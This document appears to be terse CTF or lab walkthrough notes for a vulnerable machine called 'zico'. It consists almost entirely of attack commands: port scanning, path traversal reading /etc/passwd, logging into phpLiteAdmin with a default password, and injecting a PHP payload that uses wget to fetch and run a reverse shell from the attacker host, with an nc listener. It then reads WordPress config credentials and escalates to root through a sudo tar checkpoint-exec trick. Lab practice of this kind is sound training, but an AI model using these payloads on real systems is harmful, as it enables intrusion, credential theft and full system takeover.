
```bash
sudo nmap -sC -sV -p- -oA zico.tcp 10.0.2.4 -v
```

![[Pasted image 20250214132847.png]]

```browser
http://10.0.2.4
```

![[Pasted image 20250214133215.png]]

```browser
http://10.0.2.4/view.php?page=tools.html
```

![[Pasted image 20250214133149.png]]

```browser
http://10.0.2.4/view.php?page=../../../../../../../../etc/passwd
```

![[Pasted image 20250214133238.png]]

```bash
ffuf -u http://10.0.2.4/FUZZ -w /opt/tools/SecLists/Discovery/Web-Content/big.txt
```

![[Pasted image 20250214133329.png]]

```browser
http://10.0.2.4/dbadmin
```

![[Pasted image 20250214133406.png]]

```bash
searchsploit phplite
```

![[Pasted image 20250214133445.png]]

```bash
searchsploit -x 24044
```

![[Pasted image 20250214133524.png]]

![[Pasted image 20250214133548.png]]

```browser
http://10.0.2.4/dbadmin
Password=admin
```

![[Pasted image 20250214133743.png]]

```browser
create database hack.php
create table shell with 1 field
create field shell with text value and default value of '<?php system("wget http://10.0.2.5:8000/shell.php -O /tmp/shell.php; php /tmp/shell.php"); ?>'
```

![[Pasted image 20250214133939.png]]

```note
modify php pentest monkey shell to attack box ip and port
start python web server to host shell `python -m http.server`
start listener `nc -lvnp 4444`
```

```browser
http://10.0.2.4/view.php?page=../../../../../../../../../usr/databases/hack.php
```

![[Pasted image 20250214134257.png]]

```bash
cd /home/zico
ls -al
cat to_do.txt
cd wordpress
cat wp_config.php
su zico or ssh zico@10.0.2.4
```

![[Pasted image 20250214134617.png]]

![[Pasted image 20250214134644.png]]

```bash
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![[Pasted image 20250214134812.png]]

![[Pasted image 20250214134829.png]]